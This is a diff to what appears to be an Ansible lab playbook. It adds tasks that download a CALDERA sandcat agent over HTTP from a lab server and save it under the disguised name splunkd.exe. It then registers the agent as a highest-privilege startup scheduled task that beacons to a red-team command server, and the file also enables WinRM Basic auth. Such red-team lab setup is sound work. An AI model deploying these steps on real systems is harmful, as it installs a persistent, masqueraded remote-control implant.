@@ -67,6 +67,37 @@
         winrm set winrm/config/service/auth '@{Basic="true"}'
       ignore_errors: yes
 
+    # ── Sandcat CALDERA Agent ─────────────────────────────────────────────────
+
+    - name: Deploy sandcat agent binary
+      win_shell: |
+        $server = "http://{{ lookup('env', 'LAB_HOST_IP') }}:8888"
+        $dest   = "C:\Users\Public\splunkd.exe"
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.add("platform", "windows")
+        $wc.Headers.add("file", "sandcat.go")
+        $data = $wc.DownloadData("$server/file/download")
+        Get-Process | Where-Object { $_.modules.filename -like $dest } | Stop-Process -Force -ErrorAction Ignore
+        Remove-Item -Force $dest -ErrorAction Ignore
+        [io.file]::WriteAllBytes($dest, $data) | Out-Null
+        Write-Output "Sandcat deployed to $dest"
+      when: lookup('env', 'LAB_HOST_IP') != ''
+      ignore_errors: yes
+
+    - name: Register sandcat as scheduled task (auto-start on boot)
+      win_shell: |
+        $server  = "http://{{ lookup('env', 'LAB_HOST_IP') }}:8888"
+        $action  = New-ScheduledTaskAction -Execute "C:\Users\Public\splunkd.exe" `
+                     -Argument "-server $server -group red"
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        $settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 0)
+        Register-ScheduledTask -TaskName "Sandcat" -Action $action -Trigger $trigger `
+          -Settings $settings -RunLevel Highest -Force | Out-Null
+        Start-ScheduledTask -TaskName "Sandcat"
+        Write-Output "Sandcat scheduled task registered and started"
+      when: lookup('env', 'LAB_HOST_IP') != ''
+      ignore_errors: yes
+
     # ── Verification ───────────────────────────────────────────────────────
 
     - name: Get VM hostname and IP
